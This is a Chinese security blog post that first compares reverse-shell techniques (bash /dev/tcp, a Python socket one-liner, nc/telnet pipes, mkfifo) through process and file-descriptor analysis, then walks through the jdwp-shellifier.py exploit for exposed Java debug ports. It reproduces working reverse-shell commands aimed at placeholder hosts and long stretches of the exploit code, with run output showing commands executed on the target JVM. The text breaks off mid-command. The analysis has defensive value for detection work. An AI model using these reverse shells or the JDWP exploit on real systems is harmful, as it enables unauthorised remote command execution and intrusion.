**作者：Spoock**  
**来源：<https://blog.spoock.com/2019/04/20/jdwp-rce/> **

### 说明

前面已经有两篇文章介绍了有关反弹shell的内容，[使用Java反弹shell](https://blog.spoock.com/2018/11/07/java-reverse-shell/)和[绕过exec获取反弹shell](https://blog.spoock.com/2018/11/25/getshell-bypass-exec/)。之前的文章主要聚焦如何使用java来反弹shell。网上的各种文章也是将各种反弹shell的一句话的写法。但是鲜有文章分析不同反弹shell的方式之间的差异性，以及反弹shell之间的进程关联。

### 初识

#### BASH

还是以最为简单的反弹shell为例来说明情况：

    
    
    bash -i >& /dev/tcp/ip/port 0>&1

在本例中，我使用`8888`端口反弹shell 我们使用`ss`和`lsof`查询信息：

    
    
    ss -anptw | grep 8888
    tcp  ESTAB     0      0               172.16.1.2:56862     ip:8888   users:(("bash",pid=13662,fd=2),("bash",pid=13662,fd=1),("bash",pid=13662,fd=0))
    
    lsof -i:8888
    COMMAND   PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
    bash    13662 username    0u  IPv4 518699      0t0  TCP dev:56862->ip:8888 (ESTABLISHED)
    bash    13662 username    1u  IPv4 518699      0t0  TCP dev:56862->ip:8888 (ESTABLISHED)
    bash    13662 username    2u  IPv4 518699      0t0  TCP dev:56862->ip:8888 (ESTABLISHED)

通过分析，确实与`ip:8888`建立了网络链接，并且文件描述符0/1/2均建立了网络链接。分析下其中的进程关系

    
    
    ps -ef | grep 13662
    username  13662 13645  0 16:56 pts/7    00:00:00 bash -i
    username  13645 13332  0 16:55 pts/7    00:00:00 /bin/bash
    username  13662 13645  0 16:56 pts/7    00:00:00 bash -i

当前网络链接的进程的PID是`13662`，进程是`bash -i`。而父进程是`13645`，是`/bin/bash`进程。

#### Python

以`Python`为例继续分析：

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

使用`Python`反弹shell的原理和上面`bash -i >& /dev/tcp/ip/port
0>&1`相同，只不过外面使用了`Python`封装了一下。查看信息：

    
    
    ss -anptw | grep 8888
    tcp  ESTAB      0      0               172.16.1.2:59690     IP:8888  users:(("sh",pid=19802,fd=3),("sh",pid=19802,fd=2),("sh",pid=19802,fd=1),("sh",pid=19802,fd=0),("python",pid=19801,fd=3),("python",pid=19801,fd=2),("python",pid=19801,fd=1),("python",pid=19801,fd=0))
    
    
    lsof -i:8888
    COMMAND   PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
    python  19801 username    0u  IPv4 593062      0t0  TCP usernamedev:59690->IP:8888 (ESTABLISHED)
    python  19801 username    1u  IPv4 593062      0t0  TCP usernamedev:59690->IP:8888 (ESTABLISHED)
    python  19801 username    2u  IPv4 593062      0t0  TCP usernamedev:59690->IP:8888 (ESTABLISHED)
    python  19801 username    3u  IPv4 593062      0t0  TCP usernamedev:59690->IP:8888 (ESTABLISHED)
    sh      19802 username    0u  IPv4 593062      0t0  TCP usernamedev:59690->IP:8888 (ESTABLISHED)
    sh      19802 username    1u  IPv4 593062      0t0  TCP usernamedev:59690->IP:8888 (ESTABLISHED)
    sh      19802 username    2u  IPv4 593062      0t0  TCP usernamedev:59690->IP:8888 (ESTABLISHED)
    sh      19802 username    3u  IPv4 593062      0t0  TCP usernamedev:59690->IP:8888 (ESTABLISHED)

真正进行网络通信的是进程是PID为`19802`的Sh进程，其父进程是`19801`进程。如下：

    
    
    ps -ef | grep 19802
    username  19802 19801  0 19:46 pts/7    00:00:00 /bin/sh -i
    
    ps -ef | grep 19801
    username  19801 19638  0 19:46 pts/7    00:00:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
    username  19802 19801  0 19:46 pts/7    00:00:00 /bin/sh -i

所以使用Python反弹shell的原理其实就是使用`Python`开启了`/bin/sh -i`，利用`/bin/sh -i`完成反弹shell。

#### Telnet

    
    
    telnet IP 8888 | /bin/bash | telnet IP 9999

当然上面的写法还可以换成`nc IP 8888 | /bin/bash | nc IP 9999`，本质上都是一样的。以`nc IP 8888 |
/bin/bash | nc IP 9999`为例来进行说明： 这种方式需要在远程服务器上面监听`8888`和`9999`端口。分析其中的进程关系：

    
    
    ss -anptw | grep 8888
    tcp  ESTAB     0      0               172.16.1.2:33562     IP:8888   users:(("nc",pid=21613,fd=3))                                                  
     ss -anptw | grep 9999
    tcp  ESTAB     0      0               172.16.1.2:35876     IP:9999   users:(("nc",pid=21615,fd=3))  
    
    ps -ef | grep 15166
    username  15166  7593  0 17:32 pts/10   00:00:00 zsh
    username  21613 15166  0 20:18 pts/10   00:00:00 nc IP 8888
    username  21614 15166  0 20:18 pts/10   00:00:00 /bin/bash
    username  21615 15166  0 20:18 pts/10   00:00:00 nc IP 9999

可以看到`/bin/bash`和两个nc的父进程是相同的，都是`zsh`进程。 那么 这三个进程之间是如何进行通信的呢？我们来分别看三者之间的fd。

`21614`

    
    
    ls -al /proc/21614/fd
    dr-x------ 2 username username  0 Apr 10 20:19 .
    dr-xr-xr-x 9 username username  0 Apr 10 20:19 ..
    lr-x------ 1 username username 64 Apr 10 20:19 0 -> 'pipe:[618298]'
    l-wx------ 1 username username 64 Apr 10 20:19 1 -> 'pipe:[618300]'
    lrwx------ 1 username username 64 Apr 10 20:19 2 -> /dev/pts/10

`21613`

    
    
    ls -al /proc/21613/fd
    dr-x------ 2 username username  0 Apr 10 20:19 .
    dr-xr-xr-x 9 username username  0 Apr 10 20:19 ..
    lrwx------ 1 username username 64 Apr 10 20:19 0 -> /dev/pts/10
    l-wx------ 1 username username 64 Apr 10 20:19 1 -> 'pipe:[618298]'
    lrwx------ 1 username username 64 Apr 10 20:19 2 -> /dev/pts/10
    lrwx------ 1 username username 64 Apr 10 20:19 3 -> 'socket:[617199]'

`21615`

    
    
    ls -al /proc/21615/fd
    dr-x------ 2 username username  0 Apr 10 20:19 .
    dr-xr-xr-x 9 username username  0 Apr 10 20:19 ..
    lr-x------ 1 username username 64 Apr 10 20:19 0 -> 'pipe:[618300]'
    lrwx------ 1 username username 64 Apr 10 20:19 1 -> /dev/pts/10
    lrwx------ 1 username username 64 Apr 10 20:19 2 -> /dev/pts/10
    lrwx------ 1 username username 64 Apr 10 20:19 3 -> 'socket:[619628]'

那么这三者之间的关系如下图所示:
[![img](https://images.seebug.org/content/images/2019/05/29/1559098756000-1ysuyj.png-w331s)](https://blog.spoock.com/2019/04/20/jdwp-rce/nc%E5%8F%8D%E5%BC%B9shell.jpg) 这样在`IP:8888`中输出命令就能够在`IP:9999`中看到输出。

#### mkfifo

在介绍`mkfifo`之前，需要了解一些有关Linux中与管道相关的知识。管道是一种最基本的IPC机制，主要是用于进程间的通信，完成数据传递。管道常见的就是平时看到的`pipe`。`pipe`是一种匿名管道，匿名管道只能用于有亲系关系的进程间通信，即只能在父进程与子进程或兄弟进程间通信。而通过`mkfifo`创建的管道是有名管道，有名管道就是用于没有情缘关系之间的进程通信。

而通信方式又分为：单工通信、半双工通信、全双工通信。

  * 单工通信：单工数据传输只支持数据在一个方向上传输，就和传呼机一样。例如信息只能由一方A传到另一方B，一旦确定传-输方和接受方之后，就不能改变了，只能是一方接受数据，另一方发发送数据。
  * 半双工通信：数据传输指数据可以在一个信号载体的两个方向上传输，但是不能同时传输。在半双工模式下，双方都可以作为数据的发送放和接受方，但是在同一个时刻只能是一方向另一方发送数据。
  * 全双工通信：通信双方都能在同一时刻进行发送和接收数据。这种模式就像电话一样，双方在听对方说话的同时自己也可以说话。

通过`mkfifo`创建的有名管道就是一个半双工的管道。例如：

    
    
    mkfifo /tmp/f
    ls -al  /tmp/f
    prw-r--r-- 1 username username 0 Apr 14 15:30 /tmp/f

通过`mkfifo`创建了`f`一个有名管道，可以发现其文件属性是`p`，`p`就是表示管道的含义。然后我们分析下使用`mkfifo`进行反弹shell的用法：

    
    
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 8888 > /tmp/f

分析`8888`端口：

    
    
    ss -anptw | grep 8888
    tcp  ESTAB      0      0               172.16.1.2:32976     IP:8888  users:(("nc",pid=22222,fd=3))
    
    lsof -i:8888
    COMMAND   PID    USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
    nc      22222 username    3u  IPv4 2611818      0t0  TCP usernamedev:32976->IP:8888 (ESTABLISHED)

查看进程信息：

    
    
    ps -ef | grep 22222
    username  22222 26233  0 15:48 pts/5    00:00:00 nc IP 8888
    
    ps -ef | grep 26233
    username  22220 26233  0 15:48 pts/5    00:00:00 cat /tmp/f
    username  22221 26233  0 15:48 pts/5    00:00:00 /bin/sh -i
    username  22222 26233  0 15:48 pts/5    00:00:00 nc IP 8888
    username  26233  7593  0 Apr12 pts/5    00:00:00 zsh

可以看到`cat /tmp/f`,`/bin/sh -i`，`nc IP 8888`三者的父进程相同，父进程都是`zsh`进程。那么`cat
/tmp/f`,`/bin/sh -i`，`nc IP 8888`这三者的关系又是什么样的呢？

`cat /tmp/f`

    
    
    ls -al  /proc/22220/fd
    total 0
    dr-x------ 2 username username  0 Apr 14 15:48 .
    dr-xr-xr-x 9 username username  0 Apr 14 15:48 ..
    lrwx------ 1 username username 64 Apr 14 15:48 0 -> /dev/pts/5
    l-wx------ 1 username username 64 Apr 14 15:48 1 -> 'pipe:[2609647]'
    lrwx------ 1 username username 64 Apr 14 15:48 2 -> /dev/pts/5
    lr-x------ 1 username username 64 Apr 14 15:48 3 -> /tmp/f

`/bin/sh -i`

    
    
    ls -al  /proc/22221/fd
    total 0
    dr-x------ 2 username username  0 Apr 14 15:48 .
    dr-xr-xr-x 9 username username  0 Apr 14 15:48 ..
    lr-x------ 1 username username 64 Apr 14 15:48 0 -> 'pipe:[2609647]'
    l-wx------ 1 username username 64 Apr 14 15:48 1 -> 'pipe:[2609649]'
    lrwx------ 1 username username 64 Apr 14 15:48 10 -> /dev/tty
    l-wx------ 1 username username 64 Apr 14 15:48 2 -> 'pipe:[2609649]'

`nc IP 8888`

    
    
    ls -al  /proc/22222/fd
    total 0
    dr-x------ 2 username username  0 Apr 14 15:48 .
    dr-xr-xr-x 9 username username  0 Apr 14 15:48 ..
    lr-x------ 1 username username 64 Apr 14 15:48 0 -> 'pipe:[2609649]'
    l-wx------ 1 username username 64 Apr 14 15:48 1 -> /tmp/f
    lrwx------ 1 username username 64 Apr 14 15:48 2 -> /dev/pts/5
    lrwx------ 1 username username 64 Apr 14 15:48 3 -> 'socket:[2611818]'

整个反弹shell的过程其实就是利用了`/tmp/f`作为进程通信的工具，完成了数据回显。如何理解上述的过程呢？还是流程图为例来说明。

[![img](https://images.seebug.org/content/images/2019/05/29/1559098761000-2ollnx.png-w331s)](https://blog.spoock.com/2019/04/20/jdwp-rce/mkfifo-reverse-shell.png)

通过上述的流程图，可以看到在`remote
server`的输入通过`/tmp/f`这个管道符，被`/bin/sh`当作输入。`/bin/sh`执行完命令之后，将结果有发送至`nc`的标准输入，最终就会在`remote
server`上面展示最终的命令执行的结果。

#### 小结

上面三种就是常见的反弹shell的方式。三者的利用方式也是越来越复杂，但是也基本上涵盖了目前常见的反弹shell的利用方式。

  1. `bash`的方式就是标准输入和输出分别重定向到`remote server`，这种方式最为简单，检测方法也很直观;
  2. `python`反弹shell的方式也比较的简单，本质上就是开启了一个`bash`，直接在`bash`中执行反弹shell的命令，和方式1大同小异；
  3. `mkfifo`是通过管道符传递信息，所以文件描述符大部分都是`pipe`(管道符)。但是在Linux系统中使用管道符是一个非常普遍的情况，而像`mkfifo`这种使用多个管道符来反弹shell的更加为检测识别反弹shell增加了难度。

### JDWP

其实上述的知识都是为了分析`JDWP`的反弹shell的铺垫。 根据[JDWP
协议及实现](https://www.ibm.com/developerworks/cn/java/j-lo-jpda3/index.html)

> JDWP 是 Java Debug Wire Protocol 的缩写，它定义了调试器（debugger）和被调试的 Java 虚拟机（target
> vm）之间的通信协议。

换句话说，就是`JDWP`就是JAVA的一个调试协议。本质上我们通过`IDEA`或者`eclipse`通过断点的方式调试JAVA应用时，使用的就是`JDWP`.之前写过的[Nuxeo
RCE漏洞分析](http://www.polaris-lab.com/index.php/archives/613/)中的
**第一步Docker远程调试**
用的是`JDWP`.而`JDWP`的漏洞的危害就如同之前写过的文章[xdebug的攻击面](https://blog.spoock.com/2017/09/19/xdebug-attack-surface/)。因为是调试协议，不可能带有认证信息，那么对于一个开启了调试端口的JAVA应用，我们就可能利用`JDWP`进行调试，最终执行命令。在什么时候会使用到`JDWP`这种协议呢？比如你在线上跑了一个应用，但是这个问题只有在线上才会出现问题，那么这个时候就必须开启远程调试功能了，此时就有可能被攻击者利用RCE。

JDWP是通过一个简单的握手完成通信认证。在TCP连接完之后，DEBUG的客户端就会发送`JDWP-Handshake`,而服务端同样会回复`JDWP-Handshake`.通过抓包分析：

[![img](https://images.seebug.org/content/images/2019/05/29/1559098789000-3cycoh.png-w331s)](https://blog.spoock.com/2019/04/20/jdwp-rce/jdwp-handshake.png)

#### JDWP通信解析格式

JDWP通信解析格式如下所示：
[![img](https://images.seebug.org/content/images/2019/05/29/1559098794000-4imsof.png-w331s)](https://blog.spoock.com/2019/04/20/jdwp-rce/createstring.png)

`id`和`length`的含义非常简单。`flag`字段用于表明是请求包还是返回包，如果flag是`0x80`就表示一个返回包。`CommandSet`定义了`Command`的类别。

  * 0x40,JVM的行为，例如打断点;
  * 0x40–0x7F，当运行到断点处，JVM需要进行进一步的操作;
  * 0x80，第三方扩展;

如果我们想执行RCE，以下的几个方法是尤为需要注意的：

  1. `VirtualMachine/IDSizes` 确定了能够被JVM处理的数据包的大小.
  2. `ClassType/InvokeMethod` 允许你唤起一个静态函数
  3. `ObjectReference/InvokeMethod` 、允许你唤起JVM中一个实例化对象的方法;
  4. `StackFrame/(Get|Set)` 提供了线程堆栈的pushing/popping的功能;
  5. `Event/Composite`强制JVM执行此命令的行为，此命令是调试需要的密钥。这个事件能够要求JVM按照其意愿设置断点，单步调试，以及类似与像`GDB`或者`WinGDB`的方式一样进行调试。JDWP提供了内置命令来将任意类加载到JVM内存中并调用已经存在和/或新加载的字节码。

我们以`jdwp-shellifier.py`为例来说明`JDWP`的利用方法：

    
    
    % python ./jdwp-shellifier.py -h
    usage: jdwp-shellifier.py [-h] -t IP [-p PORT] [--break-on JAVA_METHOD]
                          [--cmd COMMAND]
    
    Universal exploitation script for JDWP by @_hugsy_
    
    optional arguments:
    -h, --help            show this help message and exit
    -t IP, --target IP    Remote target IP (default: None)
    -p PORT, --port PORT  Remote target port (default: 8000)
    --break-on JAVA_METHOD
    Specify full path to method to break on (default:
        java.net.ServerSocket.accept)
        --cmd COMMAND         Specify full path to method to break on (default:
            None)

使用`python ./jdwp-shellifier.py -t my.target.ip -p 1234`尝试连接开启了`JDWP`协议的端口;
使用`--cmd`执行命令

    
    
    python ./jdwp-shellifier.py -t my.target.ip -p 1234 --cmd "touch 123.txt"

#### jdwp-shellifier分析

##### 开启调试

我们在本机开启9999的调试端口，`java -Xdebug
-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=9999 -jar demo.jar`

#### 运行jdwp

尝试连接到本机的`9999`端口，`python2 jdwp-shellifier.py -t 127.0.0.1 -p
9999`。默认情况下，会在`java.net.ServerSocket.accept()`函数加上断点。

    
    
    parser = argparse.ArgumentParser(description="Universal exploitation script for JDWP by @_hugsy_",
                                        formatter_class=argparse.ArgumentDefaultsHelpFormatter )
    
       parser.add_argument("-t", "--target", type=str, metavar="IP", help="Remote target IP", required=True)
       parser.add_argument("-p", "--port", type=int, metavar="PORT", default=8000, help="Remote target port")
    
       parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",
                           default="java.net.ServerSocket.accept", help="Specify full path to method to break on")
       parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND",
                           help="Specify command to execute remotely")
    
       args = parser.parse_args()
    
       classname, meth = str2fqclass(args.break_on)
       setattr(args, "break_on_class", classname)
       setattr(args, "break_on_method", meth)

  * `break_on_class`,`'Ljava/net/ServerSocket;'`
  * `break_on_method`,`'accept'`

之后运行`start()`方法：

    
    
    def start(self):
        self.handshake(self.host, self.port)
        self.idsizes()
        self.getversion()
        self.allclasses()
        return
    
    cli = JDWPClient(args.target, args.port)
    cli.start()

分析`self.handshake(self.host, self.port)`的握手协议：

    
    
    HANDSHAKE                 = "JDWP-Handshake"
    def handshake(self, host, port):
        s = socket.socket()
        try:
            s.connect( (host, port) )
        except socket.error as msg:
            raise Exception("Failed to connect: %s" % msg)
    
        s.send( HANDSHAKE )
    
        if s.recv( len(HANDSHAKE) ) != HANDSHAKE:
            raise Exception("Failed to handshake")
        else:
            self.socket = s
    
        return

握手协议很简单，通过`socket`发送`JDWP-Handshake`包。如果相应包也是`JDWP-Handshake`表示握手成功。

    
    
    IDSIZES_SIG               = (1, 7)
    def idsizes(self):
        self.socket.sendall( self.create_packet(IDSIZES_SIG) )
        buf = self.read_reply()
        formats = [ ("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
                    ("I", "referenceTypeIDSize"), ("I", "frameIDSize") ]
        for entry in self.parse_entries(buf, formats, False):
            for name,value  in entry.iteritems():
                setattr(self, name, value)
        return

通过向服务端发送`IDSIZES_SIG = (1,
7)`的包，然后利用`parse_entries()`方法得到一些JDWP的属性，包括`fieldIDSize`,`methodIDSize`等属性。运行完毕之后得到的属性如下：

[![img](https://images.seebug.org/content/images/2019/05/29/1559098798000-5obvcp.png-w331s)](https://blog.spoock.com/2019/04/20/jdwp-rce/idsizes.png)

之后运行`getversion()`方法，得到JVM相关的配置信息。

    
    
    def getversion(self):
        self.socket.sendall( self.create_packet(VERSION_SIG) )
        buf = self.read_reply()
        formats = [ ('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
                    ('S', "vmVersion"), ('S', "vmName"), ]
        for entry in self.parse_entries(buf, formats, False):
            for name,value  in entry.iteritems():
                setattr(self, name, value)
        return

[![img](https://images.seebug.org/content/images/2019/05/29/1559098798000-5obvcp.png-w331s)](https://blog.spoock.com/2019/04/20/jdwp-rce/idsizes.png)

接下来运行

    
    
    ALLCLASSES_SIG            = (1, 3)
    def allclasses(self):
        try:
            getattr(self, "classes")
        except:
            self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
            buf = self.read_reply()
            formats = [ ('C', "refTypeTag"),
                        (self.referenceTypeIDSize, "refTypeId"),
                        ('S', "signature"),
                        ('I', "status")]
            self.classes = self.parse_entries(buf, formats)
    
        return self.classes

通过`socket`发送`ALLCLASSES_SIG = (1,
3)`的包，利用`parse_entries()`解析返回包的数据，得到`refTypeTag`,`refTypeId`等信息。以下就是得到所有的结果：

[![img](https://images.seebug.org/content/images/2019/05/29/1559098851000-7sjyub.png-w331s)](https://blog.spoock.com/2019/04/20/jdwp-rce/classes.png)

#### runtime_exec

    
    
    def runtime_exec(jdwp, args):
        print ("[+] Targeting '%s:%d'" % (args.target, args.port))
        print ("[+] Reading settings for '%s'" % jdwp.version)
    
        # 1. get Runtime class reference
        runtimeClass = jdwp.get_class_by_name("Ljava/lang/Runtime;")
        if runtimeClass is None:
            print ("[-] Cannot find class Runtime")
            return False
        print ("[+] Found Runtime class: id=%x" % runtimeClass["refTypeId"])
    
        # 2. get getRuntime() meth reference
        jdwp.get_methods(runtimeClass["refTypeId"])
        getRuntimeMeth = jdwp.get_method_by_name("getRuntime")
        if getRuntimeMeth is None:
            print ("[-] Cannot find method Runtime.getRuntime()")
            return False
        print ("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])
    
        # 3. setup breakpoint on frequently called method
        c = jdwp.get_class_by_name( args.break_on_class )
        if c is None:
            print("[-] Could not access class '%s'" % args.break_on_class)
            print("[-] It is possible that this class is not used by application")
            print("[-] Test with another one with option `--break-on`")
            return False
    
        jdwp.get_methods( c["refTypeId"] )
        m = jdwp.get_method_by_name( args.break_on_method )
        if m is None:
            print("[-] Could not access method '%s'" % args.break_on)
            return False
    
        loc = chr( TYPE_CLASS )
        loc+= jdwp.format( jdwp.referenceTypeIDSize, c["refTypeId"] )
        loc+= jdwp.format( jdwp.methodIDSize, m["methodId"] )
        loc+= struct.pack(">II", 0, 0)
        data = [ (MODKIND_LOCATIONONLY, loc), ]
        rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
        print ("[+] Created break event id=%x" % rId)
    
        # 4. resume vm and wait for event
        jdwp.resumevm()
    
        print ("[+] Waiting for an event on '%s'" % args.break_on)
        while True:
            buf = jdwp.wait_for_event()
            ret = jdwp.parse_event_breakpoint(buf, rId)
            if ret is not None:
                break
    
        rId, tId, loc = ret
        print ("[+] Received matching event from thread %#x" % tId)
    
        jdwp.clear_event(EVENT_BREAKPOINT, rId)
    
        # 5. Now we can execute any code
        if args.cmd:
            runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
        else:
            # by default, only prints out few system properties
            runtime_exec_info(jdwp, tId)
    
        jdwp.resumevm()
    
        print ("[!] Command successfully executed")
    
        return True
    
    if runtime_exec(cli, args) == False:
        print ("[-] Exploit failed")
        retcode = 1

`runtime_exec()`此方法类似与Java反弹shell中的利用ivoke的方式得到`Runtime`对象，然后利用`Runtime`对象进一步执行命令，从而最终达到RCE。
第一步，得到`Runtime`类

    
    
    # 1. get Runtime class reference
        runtimeClass = jdwp.get_class_by_name("Ljava/lang/Runtime;")
        if runtimeClass is None:
            print ("[-] Cannot find class Runtime")
            return False
        print ("[+] Found Runtime class: id=%x" % runtimeClass["refTypeId"])

第二步，得到`getRuntime()`方法

    
    
    # 2. get getRuntime() meth reference
    jdwp.get_methods(runtimeClass["refTypeId"])
    getRuntimeMeth = jdwp.get_method_by_name("getRuntime")
    if getRuntimeMeth is None:
        print ("[-] Cannot find method Runtime.getRuntime()")
        return False
    print ("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])

以上两步的代码就类似于Java中的：

    
    
    Class cls = Class.forName("java.lang.Runtime");
    Method m = cls.getMethod("getRuntime");

第三步，得到断点设置的类和方法

    
    
     # 3. setup breakpoint on frequently called method
    c = jdwp.get_class_by_name( args.break_on_class )
    if c is None:
        print("[-] Could not access class '%s'" % args.break_on_class)
        print("[-] It is possible that this class is not used by application")
        print("[-] Test with another one with option `--break-on`")
        return False
    
    jdwp.get_methods( c["refTypeId"] )
    m = jdwp.get_method_by_name( args.break_on_method )
    if m is None:
        print("[-] Could not access method '%s'" % args.break_on)
        return False

在默认情况下，`c`是`Ljava/net/ServerSocket;`,`m`是`accept`。

[![img](https://images.seebug.org/content/images/2019/05/29/1559098854000-8jvazs.png-w331s)](https://blog.spoock.com/2019/04/20/jdwp-rce/debug.png)

第四步，向JVM发生数据，表示需要`ServerSocket.accept()`在下断点

    
    
    loc = chr( TYPE_CLASS )
    loc+= jdwp.format( jdwp.referenceTypeIDSize, c["refTypeId"] )
    loc+= jdwp.format( jdwp.methodIDSize, m["methodId"] )
    loc+= struct.pack(">II", 0, 0)
    data = [ (MODKIND_LOCATIONONLY, loc), ]
    rId = jdwp.send_event( EVENT_BREAKPOINT, *data )

第五步，等待程序运行至断点处，运行完毕之后清除断点。

    
    
    # 4. resume vm and wait for event
    jdwp.resumevm()
    
    print ("[+] Waiting for an event on '%s'" % args.break_on)
    while True:
        buf = jdwp.wait_for_event()
        ret = jdwp.parse_event_breakpoint(buf, rId)
        if ret is not None:
            break
    
    rId, tId, loc = ret
    print ("[+] Received matching event from thread %#x" % tId)
    
    jdwp.clear_event(EVENT_BREAKPOINT, rId)

第六步，执行自定义的命令

    
    
    def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, command):
        #
        # This function will invoke command as a payload, which will be running
        # with JVM privilege on host (intrusive).
        #
        print ("[+] Selected payload '%s'" % command)
    
        # 1. allocating string containing our command to exec()
        cmdObjIds = jdwp.createstring( command )
        if len(cmdObjIds) == 0:
            print ("[-] Failed to allocate command")
            return False
        cmdObjId = cmdObjIds[0]["objId"]
        print ("[+] Command string object created id:%x" % cmdObjId)
    
        # 2. use context to get Runtime object
        buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
        if buf[0] != chr(TAG_OBJECT):
            print ("[-] Unexpected returned type: expecting Object")
            return False
        rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
    
        if rt is None:
            print "[-] Failed to invoke Runtime.getRuntime()"
            return False
        print ("[+] Runtime.getRuntime() returned context id:%#x" % rt)
    
        # 3. find exec() method
        execMeth = jdwp.get_method_by_name("exec")
        if execMeth is None:
            print ("[-] Cannot find method Runtime.exec()")
            return False
        print ("[+] found Runtime.exec(): id=%x" % execMeth["methodId"])
    
        # 4. call exec() in this context with the alloc-ed  
        data = [ chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId) ]
        buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)
        if buf[0] != chr(TAG_OBJECT):
            print ("[-] Unexpected returned type: expecting Object")
            return False
        print(buf)
        retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
        print ("[+] Runtime.exec() successful, retId=%x" % retId)
    
        return True
    
    # 5. Now we can execute any code
        if args.cmd:
            runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
        else:
            # by default, only prints out few system properties
            runtime_exec_info(jdwp, tId)
    
        jdwp.resumevm()

在中最关键的就是：

    
    
    data = [ chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId) ] # 得到需要执行的反复噶
    buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)  #利用Runtime.getRuntime().exec()执行。

上面的代码就等价于Java中的：

    
    
    Class cls = Class.forName("java.lang.Runtime");
    Method m = cls.getMethod("getRuntime");
    Method exec = cls.getMethod("exec", String.class);
    // 执行getRuntime()方法，等价于 Object o = Runtime.getRuntime();
    Object o = m.invoke(cls,null);
    // 执行exec方法，等价于 Runtime.getRuntime().exec(command)
    exec.invoke(o,command);

以上就是整个执行流程。

#### 反弹shell

`demo.jar`是一个springboot的程序，核心逻辑如下：

    
    
    public class DemoApplication {
    
        public static void main(String[] args) {
            SpringApplication.run(DemoApplication.class, args);
        }
    
        @RequestMapping(path = {"/","/index"}, method = {RequestMethod.GET})
        public String index(Model model) throws Exception {
            int result = "12345".indexOf(0);
            System.out.println(result);
            return "index";
        }
    }

那么我们就可以尝试通过如下的方式进行反弹shell。

    
    
    python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd 'touch exploit.txt'

结果输出的结果如下：

    
    
    python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd 'touch exploit.txt'
    [+] Targeting '127.0.0.1:9999'
    [+] Reading settings for 'OpenJDK 64-Bit Server VM - 1.8.0_191'
    [+] Found Runtime class: id=150e
    [+] Found Runtime.getRuntime(): id=7ff960045930
    [+] Created break event id=2
    [+] Waiting for an event on 'java.lang.String.indexOf'
    [+] Received matching event from thread 0x15fa
    [+] Selected payload 'touch exploit.txt'
    [+] Command string object created id:15fb
    [+] Runtime.getRuntime() returned context id:0x15fc
    [+] found Runtime.exec(): id=7ff960011e10
    [+] Runtime.exec() successful, retId=15fd
    [!] Command successfully executed

在`demo.jar`的统计目录下查看文件：

    
    
    drwxrwxr-x 2 username username     4096 Apr 18 13:47 .
    drwxrwxr-x 8 username username     4096 Apr  7 20:39 ..
    -rw-rw-r-- 1 username username 16726504 Apr 16 20:41 demo.jar
    -rw-r--r-- 1 username username        0 Apr 18 13:47 exploit.txt

说明成功执行了cmd参数中的命令，那么我们有如何反弹shell呢?我们按照常规的反弹shell的思路,`python jdwp-shellifier.py
-t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd '/bin/bash -i
>& /dev/tcp/127.0.0.1/12345 0>&1'`，最终的运行结果如下：

    
    
    python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd '/bin/bash -i >& /dev/tcp/127.0.0.1/12345 0>&1'
    [+] Targeting '127.0.0.1:9999'
    [+] Reading settings for 'OpenJDK 64-Bit Server VM - 1.8.0_191'
    [+] Found Runtime class: id=1645
    [+] Found Runtime.getRuntime(): id=7ff960045930
    [+] Created break event id=2
    [+] Waiting for an event on 'java.lang.String.indexOf'
    [+] Received matching event from thread 0x1731
    [+] Selected payload '/bin/bash -i >& /dev/tcp/127.0.0.1/12345 0>&1'
    [+] Command string object created id:1732
    [+] Runtime.getRuntime() returned context id:0x1733
    [+] found Runtime.exec(): id=7ff960011e10
    [+] Runtime.exec() successful, retId=1734
    [!] Command successfully executed

虽然执行结果显示成功执行，但是实际上反弹shell并没有成功。原因其实在之前的文章[绕过exec获取反弹shell](https://blog.spoock.com/2018/11/25/getshell-bypass-exec/)中也已经讲过了，通过`Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port
0>&1");`这种方式是无法反弹shell的。而在本例中刚好利用的是`execMeth =
jdwp.get_method_by_name("exec")`，得到就是`public Process exec(String
command)`这个`exec()`，所以就无法反弹shell。那么按照我文章提供的种种思路，都是可以成功实现反弹shell的，我们还是通过最为简单的方式

最终我们使用如下的`python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on
'java.lang.String.indexOf' --cmd 'bash -c
